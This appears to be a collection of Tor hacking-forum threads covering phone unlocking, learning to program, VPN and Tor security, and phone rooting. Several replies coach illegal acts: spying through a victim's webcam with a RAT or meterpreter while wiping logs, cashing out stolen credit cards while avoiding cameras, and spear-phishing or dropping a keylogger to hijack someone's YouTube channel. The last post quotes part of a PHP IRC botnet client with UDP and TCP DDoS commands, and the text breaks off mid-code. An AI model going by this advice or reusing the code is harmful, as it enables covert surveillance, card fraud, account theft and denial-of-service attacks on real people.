Yes! I had the same problem recently when someone gave me their chinese tablet with a forgotten password. The problem was that it Couldn't reset cuz it was chinese. I spent a few days digging and didn't quite find the right software. Some had good reviews but they wouldn't run on my pc. Then I turned to a chinese software called 'shuame'. Dude the chinese know their shit! When I plug it in it automatically showed their app on the tab. I tapped the 'back' button and it went to my homescreen and I could access all my apps! However, when unplugged, it would lock again. So I did some more digging and found an experemental apk (that's what android apps are called) that removes all locks but you have to install it on the tab. Was kinda useless for everyone else but the perfect thing for me cuz I could access the apps in the tab. I installed it and Bob's ur uncle! All locks removed. I can track the apk down for u if u want. Oh and please state what version of android ur running.
I'm not sure but I can say it's on Icecream Sandwich. And it would be appreciated if you could post apk here.
Yea it should work there. Here's the link for shuame. http://www.shuame.com/m.html use chrome translate or just look for a download button (its pretty obvious) The unlock apk: https://www.curesec.com/data/binary/CRT-RemoveLocks.apk      just plug ur android in and wait for the sofware to detect it. (There is a remove password section in tools but that method didn't work for me) once it shows shuame screen on ur phone press the back button (not the home button). Then put this apk on an sd card and install it via myfiles.  Then hit the magic button and see your problem slither away!     If ur paranoid and think its a virus, don't try this. #justsaying 
Thank you I was able to unlock it. I ended installing an app from the play store that allowed me to send an unlock command. 
Awesome! Mind naming that app?
Not at all it's called Cerberus
Here's a nice little nugget for my fellow 0nionheadz that are interested in mass surveillance.   Now granted, Stanford, as with any major institution in the USA must at some point bend a knee to TPTB.  In other words, I'm sure there'll be at least a little disinformation, misdirection, etc., but worth it regardless.  Hopefully there will be enough of the right people in the course's forum to ask the right questions, if you're smellin' what I'm sellin'.Question Everything - Learn - Disseminate - Repeat. -F.T.W.    
Hey noobz. Welcome. So iv noticed alot of you..well.. us want to learn how to hack. Its probably the most common noob question and I asked myself the same question. I started doing some research and discovered that to be able to hack (black hat or white) you need to learn some programming languages. I realised that if you can't make it, you can't break it! (And yes, you may quote me on that. Haha) I decided I want to learn c++  I did some research (read: googled.  LoL) and found a wonderful site called www.learncpp.com  I started learning but found that alot of it was going over my head! I did some more research and found that a company called infiniteskills have made a video series teaching you c++. It wasnt free ofcourse but I 'aquired' it elsewhere. FYI c++ is the language used to develope programs. Some of the people on this wonderful site have even recomended python to start with. I started learning c++ but after a while got a little lazy  so heres my million dollar idea: A few of us noobs start learning together! That way if one doesnt understand something another can explain it! We can also keep each other motivated! So here I am. MANG00L00VER (that's what my name was supposed to be. I screwed up at signup) Prepared to start this journy. Who wants to join me? Five spots open! Reply now and lets become Legends together! Today, python/c++. Tomorrow html, sql, php, and assembler. After that, the WORLD! (Why does this sound like a tv ad? LoL)
If we conduct ourselves here on the forum then that is fine, since we don't want to give up too much personal information, otherwise what's the point of Tor. But I shall join you on the journey. I Cornelius, will join you, so that I may better myself technically, and perhaps even be able to one day use it for the cause of a better world.
Yeah I thought the same thing. I think there are also some good tor mail services which are confidential and maybe someone could suggest the best ones here. Btw what language do you wanna start with? Python? Personally I really wanna learn assembler but I believe its not a good language to start with. 
I don't know where to begin. I'm not technically advanced like most people here are, however, I do know the basics of Java, if that's worth anything.
Hello Fellow learners :) Although I do not wish to join your journey, I thought I might push in a helpful direction. If you visit "www.codecademy.com" (Which is completely free), you will find courses that teach some of the languages you want to learn in a very helpful way.Good hunting 
Thank you DeepSerenity for the link, I'll be sure to take a look at it.
You can check World of Corecraft, it is a World of Warcraft: The Burning Crusade private server, but the owners decided to teach others C# (not C++, but it doesn't really differ that much). All you need to do is hop on IRC 2 hours on Saturday, also if you can't they update the course weekly and you can download it and learn it on your own, but there are plenty of people there already and they can help you. You may have to catch up and it could be tough, but people there can really be of help, I am learning alone, but they helped when I needed some assitance.
Thanks @DeepSerenity ans @danhk for the pushes. @ Cornelius, I've downloaded a book on python called Learning Python,3rd edition. It has given a good intro so far and I'm really enjoying it. I suggest the way we move forward is set milestones and deadlines for certian topics for example: In 24 hours from now we must have read the intro (which is abit long but teaches a lot) and have python installed on the pc. If you have read further then maybe even state where you are to encourage the others ( which right now is only me, lol). I don't know if you want to do this as I realise that most people like to move at their own pace on their own time but the reason I do encourage this is because I have tried the alone method and it does work for a couple of days but then you get distracted and the learning comes to a sudden finish. If you do have another idea or an edit to this idea then lets hear it. Here is the link to the book: <a href="http://xfmro77i3lixucja.onion/book/503be40ca78f332da2b11ea2"> Hope this is a clickable link :) </a>  I think that as we go further the milestones will be something like "grasp THIS concept" and then we can share our sources etc.
Sounds good. I'll get to it. And again thanks for the push danhk and DeepSerenity.
Ok here's an update: I've read the intro (well...one page left) and python is busy downloading. I've been reeally busy for the past 2 days but now I plan to wake up a little earlier and learn python on a fresh mind. any updates??
I've got the book downloaded, but I too have been busy, still need to read it though, I shall probably read it in an hour or so. I've been busy with a few other reads I had on my little list.
Progress report:I am officially a python programmer! lol. Im positive that i wont be recieving any awards fot the 2 line code that i wrote but its the fact that i understand whats going on when i excecute the program thats just so rewarding. I think im in chapter 4 on page 60 out of 756 pages (i resized the text).
Well you've made progress, I need to start catching up.
Ok so today i decided to check out codeacademy. They are SO awesome! I think you should read the intro in the book but not all at once. Read a bit until you're bored (it does get boring) then go to codeacademy and start the lessons. They get straight to the point. I think that you will really love it.
I've been reading quite a bit lately, made it to chapter 3 or 4 now I think. Still have got no clue how to work this thing, I'm thinking I may have downloaded the wrong version perhaps. I got 3.x instead of 2.x
Dude just check out codeacademy. You WILL be amazed and glued. After learning the basics, i now have to write a script that calculates the tip for  a meal. basically a tiny program. Amazingly, nothing has flown over my head until now.
I'll try that one out, perhaps it will work better than the book.
Did u check it out? I'm done like 7%!
I can help you guys out with both hacking and python if you want.
The best thing you can do is forget about the bullshit technology, and think about what specifically you want to do. Then find out specifically how to do it using best practices. Develop focus and all else will follow.
@ tanuki. Your help will definitely be appreciated! Will ask u if I need help :)@ mousqito.  I dont get what you mean when  you say forget about the bullshit technology. What I specifically want to do is know all things technical like the back of my hand. Currently if I face a problem, a little research usually gets me out of the pickle. So im kinda already following ur advice. But right now I want to focus on developement. 
I would be glad to join you guys in learning the programming world :), I've been following the posts and doing the coding work on codeacademy. I'm almost half way done the java part now.
How are things going? Still making progress? I am also fairly new. I don't know python but I am interested in learning C/C++ and Assembly particularly for cracking and reverse engineering purposes. I have been studying and making progress on the C/C++ and ASM front lately. I am also faily familiar with mysql, php, html, so I may be able to help there.
Hii guys! Soo I haven't updated this thread lately but that doesn't mean I haven't been making progress! One of my friends wnted to start html sowe started that together. I'm still doing python also but not that fast. As for html, I can pretty much make a website no on html though. @2l2qQT and SecSecGoose: welcome!  @SecSecGoose I also initially wanted to learn c++ for pretty much the same reasons and got a little far but then I got lazy I guess. Which section are you currently at?@
I am mid way through Ch. 2 of The C Programming Language by K&R. It is supposed to be the definitive text on C. From what I understand C++ is essentially C with OOP and some other minor add-ons.I have been somewhat distracted from that book though, I found a cool reverse engineering tutorial on the clearweb: http://thelegendofrandom.com/blog/sample-page. It is teaching me the basics of x86 assembly and the OllyDbg software from a practical perspective. I really like it so far.
I've heard that it's possible to tap remotely into computer video cameras and activate them without anyone's knowledge (meaning the light doesn't come off). If so, how can you tell if it's happening to you at this moment?
Well, the way this is done is through infecting the victim with a RAT, such as DarkComet or CyberGate. To find out if you are infected (this is the only way you can be spied on with your webcam) just do a virus scan of your computer.
It depends if they're using Windows.Either way, social engineering will be your best bet.
You can tap into a person's personal video camera on their computer once you've gained administrator access to it (in some cases), through a payload or meterpreter session this would be easy to accomplish, simply tell the machine to capture live snapshots every second. However, all this would require you to actually gain access to the machine, assuming that you won't be detected or found because of carelessness and forgetting to delete /var/logs etc..I would recommend first learning how to hack computers remotely via exploitation and vulnerability triggers over connections of wifi or the internet (*cough* shodanhq *cough*), try hacking another computer of yours at home to gain practice getting into machines silently.
@Det0x Thanks for the advice@Kazuya Wait, so does that mean that the cameras can only work if it has software to run it? Does that go for security cameras or even regular recording cameras as well?@Indigo1011 If you're asking a computer camera to send info from a victim and back to you, can't that be traced? How do people even get away with that?
Security cameras and cctv are a bit of different beast from "pc webcams", although the technology is overlapping in recent years.  Social engineering would definitely be your best bet for cctv and security camera access to feeds or footage.  Webcams attached to pcs are easy to access remotely if you're on the same network.  WebRTC would allow you to live chat with a victim.... so that is fun.  Something like: https://community.rapid7.com/community/metasploit/blog/2014/02/18/lets-talk-about-your-security-breach-with-metasploit-literallySet up a little "lab" in your house using an old machine.  Try exploits and play in your own sandbox first. Try using the standard metasploit console to activate a webcam on your own "victim" laptop.Anytime that you choose to engage in ethically flexible behavior on a remote system (not your own) don't be silly and do questionable things from the comfort of you own home.  Security is not an achievable goal only acceptable levels of risk.ENJOY
@Spyra Of course it can, though one you hack in, you cover the logs (make them look less suspicious and cover yourself), then drop a payload to do that. You aren't likely to be traced if those precautions are taken, the only thing that will give you away is by the camera's light turning on when you start capturing, letting the person know that the camera is on and doing something without their consent.Learn and practice, and you shouldn't have a problem. Get programs that 'say' they will do this for you, become a script kiddie and such, and you will definitely be hacked/traced back, then taught a lesson.Be careful, at times its shits and giggles, other times though if you screw up that could be the end of your hacking career with a 20+ year sentence for cyber crimes (and whatever else they can dig on you).
@eggman do you have any good sources on social engineering that I could look at?@Indigo1011 thanks for the advice.
@eggman do you have any good sources on social engineering that I could look at?@Indigo1011 thanks for the advice.
@Spyra - If you want some info on social engineering read about Kevin Mitnick.  The Art of Deception is a book by Kevin Mitnick that covers the ART of social engineering. Part of the book is composed of real stories, and examples of how social engineering can be combined with hacking.  Kevin Mitnick, you simply must know that name.That book can be found below with may other resourceshttp://4iahqcjrtmxwofr6.onion/library.php
 
Why does everybody keep assuming you need a "mentor" to become a hacker? Stupid school boy mentality. Hackers figure shit out for themselves. Figure it out for yourself...
To start, you should begin by Hacking your own mind and question everything you have ever been taught! Then you will be close to becoming an expert hacker. Unindoctrinate!
Really my advice... Get Kali and get another computer to hack.Nothing illegal is happening but you are still learning how to hack...do some research on data dumps and memory scanners...Leaving the rest to you.Enjoy!!!!V is for my vendetta-Gunner Zodiac Russtle
Google is your best friend now.
I do not usually mentor people as the best way to learn is through self tutoring. But I will say this: hacking is only worth doing for the good of the many, learning to hack for oneselves own gain is unethical and immoral, and I will personally DOX your ass if you want me to teach you how to commit fraud for personal gain.
@nobody_here_01Oh then you might hate me,I stole over 1million dollars from a casino that was cheating...
@gunerzzLol we have all had our blackhat days, and I hate casinos so give me a link and ill dive in because im poor right now!
@nobody_here_01:Wow, such principles. Much impressed. LOL
@HakunaMatataI have had my blackhat/money laundering days. I just don't believe in stealing from innocents for ones own gain. I use my skills to help people not end them.
@nobody_here_01 So, you're like a robin hood? Stealing from the rich and giving to the needy? Or just stealing from people you think are corrupt for a "just cause"?
Asking for a mentor automatically disqualifies you from being a hacker. A noble request though.
Just gonna explain what mousqito meant.A hacker is not just someone that knows some code and exploits for certain systems. That can be any programmer or script kiddie. A hacker is someone that likes to "tinker" with things (not just code) and see what else can be done with it. In mundane terms, it's an advanced explorer. Having that in mind, requesting a mentor proves that you do not wish to explore and find out what you can do, you just want to be instructed by someone who does. You're requesting to be a minion.
Would someone be willing to teach me how to hack?. I warn I don't have money,if your willing to teach me it would have to be free or maybe talk and get to a deal where we both win.
There's too many threads about this.. You need to read the entire forum, then ask this.
Your right I will.
Yes i've readed many topics but the only things I found was:-Two members trying to pay a hacker for their personal benefits-Some experiences of hackers-A hacker proposing another hacker buissness alliance.
I know 0% of hacking but I would like to learn and I know im a fast learner once someone explains me how to do something, my intentions are not for personal benefit, what I want to do is justice.
Learn a programming language. Python is a good language to start with. The site I usually recommend is Learn Python the Hard Way.Maybe then you can go read articles at Black Hat Library.If there is something specific you want you can always search the list on my ebooks thread and request me to upload it. Link
Actually learning to hack stuff starts with learning how it is working... Once you got that, you can start to find the weak point...
I sort of have a problem with this question @Shadow123.  If you have to ask someone to teach you to "Be a Hacker", you'll probably never be one.  I might be misjudging the nature of this question, and if I am I would love to hear your explanation of why you think I am incorrect. However, what I see when I read the question "Will someone teach me to be a hacker?" is "Will someone teach me how to do impressive, sneaky, exciting 'hollywood' type things with computers so I can impress people with my unauthorized access to information... oh yeah and possibly steal shit from people?".  And, after you teach me how to be a hacker, I already have my cool youtube backdrop setup to take credit for the impressive security avoiding feats I've accomplished.You should search for information on ESR (Eric S. Raymond) and read his comments on what it means to be a hacker.  He is the real deal, and has many salient obersvations about what hacking really is...   A love of learning, figuring out how things work, and how systems interoperate is what is needed to be a true hacker.With that said, who cares about titles... Find topics and systems that are interesting to you, learn, and create, and challenge.  Who cares if someone thinks you're a "hacker".  Do what you love, learn, poke, prod, discover, and play with it.So.. if what you really want to do is access networked systems by finding security flaws or exploiting application weaknesses, start by learning how those systems work from the ground up.  All of the parts.  Hardware, OS, Networking, Applications, Who works on these systems?, who supports them?, who sells them?, who disposes of them?...(you get the idea)  Magic 90 second uber fast typing in command shells (like they do in the movies) is never how hacking is really done.  It's hours, and days, and weeks, and months of patient, dilligent, careful learning, observing, documenting and planning.  Then being invisible and not having the adolescent need to brag about your conquests, when you've accomplished your goals.
@011011, I want to be a hacker to make justice.
Thanks Soldierboy.
@Shadow123 , That's a lofty goal, and an admirable one.What is your message?What injustice would you see set aright?How would hacking (in whatever way you define it, which I'm open to hearing...) help you accomplish making the world a more just place?
What i've learned through my life is that the world is full of corruption, that though almost all people cross their arms and just let this happen even if they know it's a injustice, and there are a little group of people who actually want to change this but corruption has a lot of power and doesn't let those good people change the world. With the hacking I could somehow do something, open people's eyes,stop future corrupt proyects,etc... Im not saying that I would change the world but I would make a begining for a change.
Download a book about hacking and go through it to learn the essentials, you can find them here:**Hacking - Firewalls And Networks How To Hack Into Remote Compute **http://thepiratebay.se/torrent/6030484/Hacking_-_Firewalls_And_Networks_How_To_Hack_Into_Remote_Compute____________**The Code Book: How to Make It, Break It, Hack It, Crack It -Mant **http://thepiratebay.se/torrent/6751767/The_Code_Book__How_to_Make_It__Break_It__Hack_It__Crack_It_-Mant____________**And also don't forget to check other ebooks about BackTrack which is a very powerful operating system that contains lot of hacking tools: http://thepiratebay.se/search/backtrack/0/7/601**Hope this helps.
Backtrack has been replaced by Kali, which is bloated. As someone else over here recommended me, I recommend Arch Linux. And here's the pentesting version.
Thank you people for helping me.
Your trying to bargain trade secrets for a conversation? If your asking for help when you know nothing you will never be a hacker.
The only one who can teach you Hacking is yourself. Read it, learn it, understand it, for what is important! The first thing i would recommend you is: "The Conscience of a Hacker" from The Mentor.http://phrack.org/issues/7/3.html
I hear a VPN is needed to be truly safe on Tor and on the internet. However I have no idea how to start one and which ones to choose. Just give me the knowledge to start a safe VPN. I will appreate any advice you give me, thank you.
If you don't know what you're doing, a VPN is not going to help. That being said, this is a good place to start: Jolly Roger's Security Guide for Beginners
TOR is more secure than any VPN you are likely to find, however it is a lot slower and obviously can only be used in a browser form. A VPN tunnels all of your traffic through someone elses server, encrypting it and hiding the origin (you). This lets you use any application on your computer with no risk of exposing your IP like Skype, Minecraft, Google Chrome, ect. Most commercial VPNs log your usage, for incase the authorities ask them to hand it over, so I would reccomend you keep any illicit activities confined to TOR.
Tor is not limited to a browser !It acts like a SOCKS proxy, so directing all of your traffic through Tor is perfectly possible !But it is hard not to leak your IP, through JavaScript per example (c.f. Freedom Hosting hack), DNS leak, ...The good thing is that lots of people have worked on this issue and came out with solutions :1. Tails is a custom Linux distro specifically built for tunneling every traffic through Tor. You can hope every feature has been carefully thought through.  But you could still leak your IP if you leave JavaScript activated for example.2. To cope with plugins leakage : Whonix works as a couple of VM. One is not connected to the Internet at all, the other one is and act as a gateway : Local Network <TOR> Internet. The first VM is only allowed to connect to the gateway, meaning it never knows your public IP address therefore cannot leak it.3. Same idea as Whonix but for Windows users, look for TORtilla !

Anyone have any knowledge on how to unlock phones? Preferably iPhones. Thank you
If you're looking to unlock a specific device than please post the baseband number and ios version. I'm not an expert but I have unlocked phones following tutorials from the likes of redmondpie and would be glad to point you in the right direction. 
Are there any security risks with chaining multiple instances of Tor? Even if it's not strictly necessary, would it introduce any new attack vectors?For example, in the diagram below a tor tunnel is created between the middlebox and the internet, then an additional tor tunnel is created through tunnel 1, from each client computer (running tor browser) to the internet:Internet <==> (NIC1) Tor Router Middlebox (NIC2) <==> Firewall (Allow Tor Port) <==> Client Computers Running Tor BrowserIf I understand correctly the tor network side of things would look like this:Local Network <-> Tor Entry Tunnel1 <-> Tor Magic <-> Tor Exit Tunnel1 <-> Tor Entry Tunnel2 <-> Tor Magic <-> Tor Exit Tunnel2 <-> Internet
My security at the moment is pretty bad. Im not sure if this will compromise me so i will try and be vague.I have a paid VPN running on my current PC . I have portforwaridng enabled. I am running a UDP connection. I am using DNS leak protection. And Ipv6 leak protection. Encryption:Data Encryption: AES 256Data Authentication: SHA256Handshake: RSA-4096Then I use Tor for everything. This is terrible I know. I want to change it. Can you guys help me? :P I want the best security possible. Please include links on how to do it etc.I am also looking for apps for the following features:Instant unrecoverable uninteruptable data wipe. Bounce all traffic off a satalite eg: google earth? (possible?)Create a custom VPN.Bounce traffic off a no reffer website automaticaly?
Actually, it seems to me you'd be a pretty hard target to get with all that security, you already have more security than about 70% of the world (I know A LOT of people who don't even use anti-virus protection at that).The only thing I could see as being exploitable is the SHA256, which is an encryption that already has a well known decryption method, as well as programs.As for your Virtual Private Network, I'd be careful that you trust them. You're basically trusting these people to host you on their own little network mirrored to the internet. But, I'm sure you've chosen one already that assures you no leakage and anonymity (Like SecureShield, or VPN Shield).As for the apps:If you have firefox, iceweasel, etc:You could use cookie destroyer, which deletes all cookies from your computer after you get done using them on that specific webpage.You could also get an extension that hashes your net-traffic, which would make it very hard to decrypt anything you do.To create a custom Virtual Private Network, you would have to create your own server, pay to have it hosted, yada, yada, yada... The one you're on should do the trick since you really wouldn't want to go through the hassle of creating your own VPN.Such extensions can be found on Internet Explorer, Chrome, etc. I just don't know the names for them.Hope that helps.
Best to contain your setup in a VM, this allows a buffer to be setup between your high risk surfing and your real PC in case something does slip through. You can also take snapshots of clean setups that you can revert to each time before surfing to ensure no cookies, trojans etc are carried over between sessions. You can go to insane lengths for security but your current setup + VM should be adequate unless you start making yourself a serious target for someone or group who either seriously knows what they're doing and/or willing to spend alot of effort to get to you..Routing traffic through satellite is mostly movie fiction, its laggy as fuck and you're far better off going the beaten path and blending in to normal traffic. Custom VPNs arent too difficult to setup but require a trustworthy server unless your using its as a hop on a multi-hop setup. No software is going to give you a reliable instant unrecoverable data wipe, the only real solution to this is a big ass electromagnet + magnetic storage, I've heard of people hiding them in their door frames so that if their computer/hard drive is carried outside of the room it is wiped (there are still forensic labs that may be able to piece parts of the data back together but your best bet is whole disk encryption + something like this.
@Indigo1011Thats great advise thanks. What encryption would you use in replacement for SHA256?@c0ding101I will start using a VM but for some reasonw whenever I save something on it, it is gone the next session. Would mounting Tails from a USB/CD be equally effective. Or using a RAT on a remote PC and do all my "undesirable" work on that."undesirable=wouldn't want nsa looking at"
SHA256 is a hashing algorithm, technically it is ecryption but a one way cipher. Its purpose is to basically summarize any size portion of data, though normally larger, into a fixed size, in this case 256bit. This can be verified by running the same algorithm on the same data later on to verify its authenticity. I don't know what information Indigo1011 is working off but SHA256 has not been broken publicly yet and is unlikely to in the near future, if it was the whole bitcoin system would be totally fucked! MD5 algorithm on the other hand is pretty much swiss cheese these days, avoid at all costs..
Mounting Tails or some other linux live distro inside the VM as a live disc (can just mount the iso as the virtual machines DVD drive directly) is a good option if you dont plan on keeping anything between sessions. If you do plan on doing work that you really dont want to be found doing use a public wifi hotspot + your setup above..
SHA256 is the bitcoin mining algorhythm. To me this means 2 things, 1: there are hundreds of millions of dollars in bitcoin bounty for anyone that trully breaks it, so I believe it is currently secure. 2: There are people with considerable brute force capabilities for SHA256 in the form of bitcoin mining rigs.If you want to increase your security get a whonix setup with tails. This gives you the extra layer of VM security, but compartmentalized into two VMs so that if one is compromised, the other isn't. For opening files you should setup a VM inside of the other VM, with networking disabled.
If you want to get your own VPN, you can rent a VPS/Dedicated server for under $10/month and run either OpenVPN or PPTP method.
I have about 4 lots of credit card detials, and I'm not quite sure how to use these (preferably to get bitcoins from them).They are all linked to paypal so that isn't an option. is there any way that i can use localbitcoins with a creditcard, that doesn't require verification? Of course I can't order any physical goods (for myself at least), so the two options i can see are either buying gift cards and excahnging them, or finding an online method of cashing out money with a credit card (Like paypal, but that they haven't already been registered for).Any ideas?
Can use a cell phone, buy a cheap touch screen from wally world or target, activate and get some decent apps, some network cloakers or IPV4 redesigners and a IP relocator. Or just use a wifi that is not yours, way away from your house, to do what you need, making sure to keep a good eye for cameras and the like, as most are recordered and if they are a franchise or a large chain, they will be backed up daily. You can use localbitcoins but remember, no one is going to meet you in a darkalley and those that are experienced are going to want an well lit place and probably somewhere with cameras and of course, they will see your face and it gives the other person a discomforting feel if you walk in with a cap and sunglasses on hahahahaha. Make sure to never cash out a card completely, doesnt matter if its a $1 or $2 left, keep it in there.
Ever since I had my first Acorn Electron I've been interested in learning how to code but never really managed much more than Basic.  I have dabbled in HTML, java and C/C++, but because of my short attention span I always gave up.  Recently I've come to the conclusion that the reason I always gave up was a lack of a specific reason to know them, thats where Assembly comes in.With all the reports of backdoors being built into everything from phones to laptops, I figured that learning an assembly language might be useful in spotting them or maybe even doing something about them.  My problem is that I don't know where to start learning.  I have a basic grasp of the syntax in a few languages but not much else.  Could anyone recomend a place for me to start?Thanks in advance for any info you might have.
You could try codeacademy or w3schools to learn the basics, and then go on to learn more advanced modules of the language you desire to learn.I would recommend going to the TOR library and reading some programming books there, but if you have a short attention span it may be hard to stay focused.
I'll check out codeacademy and w3schools, thanks.  I looked at the TOR library and It overwhealmed me a bit.  Any suggestions on what to read first would be greatly appreciated. The short attention span just means it might take me longer, but I always get there in the end (when it's something I have a genuine interest in and a purpose for doing it). lolThanks for helping though Indigo1011.
Try to pick the best book on Assembly, some clearnet references:read the reviews here: http://www.amazon.com/Best-Sellers-Books-Assembly-Language-Programming/zgbs/books/3954from the stackexchange network: https://programmers.stackexchange.com/questions/102916/is-there-a-canonical-book-on-x86-assembly
Python is a nice beginner language to start learning, easy to start and comprehend, and (one you get the basics) simple to master.They have an entire directory in the TOR library dedicated to Python under computing (although it's not a lot of books for python).
Hello,I think you will be interested in this lecture :Introductory Intel x86: Architecture, Assembly, Applications, & Alliteration
This may be a nieve idea, but I mean it for good intentions.

http://daserste.ndr.de/panorama/aktuell/NSA-targets-the-privacy-conscious,nsa230.html (multipage, page changeable @ the bottom)http://daserste.ndr.de/panorama/xkeyscorerules100.txt (a bit of sourcecode)Tor is really a primary target for the NSA! They are actively monitoring the most important nodes. A small list of IP's that are especially monitored (extracted from the second link, you can be sure there are more):193.23.244.244194.109.206.21286.59.21.38213.115.239.118212.112.245.170128.31.0.39216.224.124.114208.83.223.34128.31.0.34Extracted using "grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'".
This is interesting. I didn't know they were ACTIVELY interested, but rather collecting data dumps.
That's why we need more people with diverse interests joining tor, and we should all run relays or bridges.
Yes, the NSA have red-listed (Via algorithms) anyone who looks up Tails, or TOR. They are also capable of piecing together your encrypted packets, and even if they can't break the encryption they'll keep the data till they can. So get a VPN, a proxy, and a plethora of other security measures to at least attempt security. 
Mantra: "security is not an achievable goal, but an aspiration that includes accepted levels of risk"
I would like some input, mostly on some vulnerabilities that has been found on the Android OS recently (which has allowed me to easily root my phone and others').However, I never dived into the IOS for Apple phones, and was wondering if anyone knows any good vulnerabilities on those phones to help me easily gain administrator access.The reason for me wanting to root phones:1. Easiest and most buggy software to date can be found on phones, easy for me to get on 'personal' computers than laptops, etc.2. I get paid to root/jailbreak.3. "The more you know! :)" 
@Indigo1011: Take a look at this site - http://www.dashhacks.com/iphone/iphone-jailbreakHope it helps.
@viriato Thanks for the info, I'll take a look at it.
Indigo..., you don't use Ebay or Paypal for offering root/jailbreak services? Reason I ask is that I've crawled (in the last 6 months) a lot of recycled code regarding wildcard hybrid brute force queries with origins from Ebay and PayPal for specifically jailbreak type sales/buy/trade/etc in many domains those two even find interest in much less buy. Just watching out for you since I was once completely screwed over by Ebay and PayPal.Basically they tried to recoup thousands of dollars from me for "unlocked" android phones b/c they claimed the ad said rooted even though snapshots from me confirmed otherwise.
@JimLahey Thanks for the concern :).Fortunately, I don't use Paypal or Ebay to offer these services (I don't trust them for various reasons). I take encrypted exchange and usually sell these phones when I gain administrative access, when bought I drop them at a close location to be picked up while the money gets transferred via BTC or LTC.
I didnt think most Android phones required vulnerabilities to root your device, only ones with locked bootloaders which is increasingly rare these days?
@c0ding101Most phones require vulnerabilities in the kernel. The easiest to break recently have be Gingerbread and ICS (at least for me). These vulnerabilities usually involve getting the information or logging info necessary to gain access to the root folder. A locked bootloader doesn't really matter, unless of course you want the ClockWork processes. Android is pretty easy to gain access to, once you find the vulnerabilities. Then from there, use ADB debugger for android to push the exploit file via python and execute it within the tmp directory. Exploits vary from common to complex (It makes me frustrated that I can't find one for my Galaxy S Blaze 4g, because most of the old exploits won't work with the recent models being put out).Some of the exploits I get from XDA Developers, some I have to make myself since one may or may not have been made yet for a current model of android phone.I haven't had a problem with bootlocked phones, I have one and the only problem I have is not being able to get into the developer menu via the pushing of the volume buttons and power. At that point I go straight into the terminal (which I get off the playstore) and I immediately (after gaining root temporarly, since if I turned the phone off and back on I would lose it) get busybox to load more bash commands to the internal linux, and then push the Superuser approval into the root folder manually, then activating it. I'm by no means a 'master' or anything of the sort (I wouldn't even call myself adept), but I enjoy learning these things and tinkering around with phones. I also (eventually) would like to make a remote exploitation for androids, which I could gain root (or at least guest access) to do such things as VNC the phone remotely, or read messages being sent/received.I still have a lot to learn though.
Hello all,I wanted to know how I would go about hacking people's youtube channels. My goal may seem pretty trivial compared to the rest of you, which I understand, but it would really help me out. I don't plan on using this against anyone innocent, just a few guys who once upon of time jacked a friend of mines fairly successful channel. They had the help of some guy named Boil, who as far as our little youtube community went, is fairly well known for this type of thing. I figured if he can do it, I can learn too. Which is Why I'm here. To learn.I don't need this all handed to me (although it would help). I'm willing to learn and put in work myself. Just tell me what to, what to read. Point me in the right direction. I have a lot to learn, but I'm very eager, and I think that some if not most of you should have something to provide, given how much more advanced you are than myself. Anything helps. Thanks for reading.-Zumo
How long ago did they hijack your friends channel? It could of been done a number of ways, it was most likely achieved by spearphishing, another one could be session hijacking over HTTP which was all the rage a year or two ago (hence the how long ago question) but I have no idea if these people are local to you or just randoms off the internet..
Must have been eight or nine months ago. I learned about the deep web rather recently, and figured they could have learned how to around some place like here. I learned the other day that they're still going strong on another channel, so I think this is as good as time as any to get even. Plus I'm very curious, there's a lot of interesting things to read about here.Mind elaborating on the two methods you mentioned? If you are busy I get it, but maybe you might know how I could start learning about them myself? Thank you very much. I appreicate the response.

Google phishing, its basically just targeted campaign against someone via a communication medium attempting to coere them to click on a link or open a file that drops malware. Its basically phishing but when its targeted at a specific user or organisition they call it spear-phishing ;) If these people are local to you and can be in a close physical vicinity it opens up a lot more possibilities in the number of different attack techniques and decreases complexity/effort alot. Your friend may have also been using the same password for multiple sites and got stung when one of the other sites he was a member of was hacked and his password was exposed. It could of just been completely random infection. I would need to know more about the situation to really narrow it down..
So I could get like a keylogger that would download when he clicks a link? I can easily get him to do that, he's not the brightest. But I think even he would be wary about downloading and running an .exe, so that might be out.Know where I can find one that auto downloads in background upon clicking a link? That should do it. I have the channel email and the necessary informtaion to recover it, because they most likely have 2 step on it with phone nnumber verification.What's the other method all about? Session hijacking over HTTPS? Sorry if you don't enjoy being bombarded with questions, haha.
I dont mind pointing people in the right direction but dont have the time to walk every person who asks through things that are explained in great detail just by googling some of these techniques. If you are a complete noob, have a look at some of the hak5 videos. Teaching you to be self sufficient and having the ability to research and utilize these techniques yourself is the greatest gift I could give you (coming from someone who used to ask the exact same questions as you).Just for clarifications sake it was session hijacking over HTTP, HTTPS is encrypted and makes it a whole lot harder, if not to the point of being impractictel.
Hello. I recently came accross this code on pastebin please tell me what it does as it is aimed at my old IRC channel:    <?php    $server="http://webchat.voxanon.org/?channels=couldbeusedtoidme";    $Port="6667";    $nick="bot-";$botNumber;    $botNumber=mt_rand(0,3);    $nicknummer=mt_rand(100000,999999);    $Channel="#couldbeusedtoidme";    $Channelpass="notmyrealpass";    $msg="Later R3n.";     set_time_limit(0);    $loop = 0; $loopArray = 0;    $openSocket = fsockopen($server, $Port);     while ($read = fgets($openSocket,512)) {        $read = str_replace("\n","",$read); $read = str_replace("\r","",$read);       $read2 = explode(" ",$read);        if ($loop == 0) {             fputs($openSocket,"nick $nick$nicknummer\n\n");             fputs($openSocket,"USER RenB0t 0 * :woopie\n\n");       }        if ($read2[0] == "PING") { fputs($openSocket,'PONG '.str_replace(':','',$read2[1])."\n"); }        if ($read2[1] == 251) {             fputs($openSocket,"join $Channel $Channelpass\n");             $loopArray++;       }         if (eregi("bot-op",$read)) {            fputs($openSocket,"mode $Channel +o $read2[4]\n");       }         if (eregi("bot-deop",$read)) {            fputs($openSocket,"mode $Channel -o $read2[4]\n");       }        if (eregi("bot-quit",$read)) {            fputs($openSocket,"quit :$msg\n\n");            break;       }        if (eregi("help",$read)) {            fputs($openSocket,"privmsg $Channel :Reneg4d3 BotNet Version 1.0\n");                    fputs($openSocket,"privmsg $Channel :Use the commands:\n");                    fputs($openSocket,"privmsg $Channel :bot-op\n");                    fputs($openSocket,"privmsg $Channel :bot-deop\n");                    fputs($openSocket,"privmsg $Channel :bot-quit\n");                    fputs($openSocket,"privmsg $Channel :bot-join\n");                    fputs($openSocket,"privmsg $Channel :bot-part\n");                    fputs($openSocket,"privmsg $Channel :ddos-udp {Parameters}\n");                    fputs($openSocket,"privmsg $Channel :ddos-tcp {Parameters}\n");       }        if (eregi("bot-join",$read)) {            fputs($openSocket,"join $read2[4]\n");       }        if (eregi("bot-part",$read)) {            fputs($openSocket,"part $read2[4]\n");   